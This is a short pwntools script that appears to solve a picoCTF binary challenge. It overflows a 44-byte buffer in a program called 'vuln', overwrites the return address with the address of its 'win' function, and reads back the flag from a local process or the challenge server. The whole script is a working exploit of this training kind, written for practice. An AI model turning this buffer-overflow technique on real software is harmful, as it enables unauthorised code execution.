#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("dolphin-cove.picoctf.net", 55431)

    return r


def main():
    r = conn()

    r.sendlineafter(b"key: ", b"A" * 0x2c + p64(exe.sym.win))
    flag = r.recvlines(2)[-1].decode()
    log.success(flag)


if __name__ == "__main__":
    main()
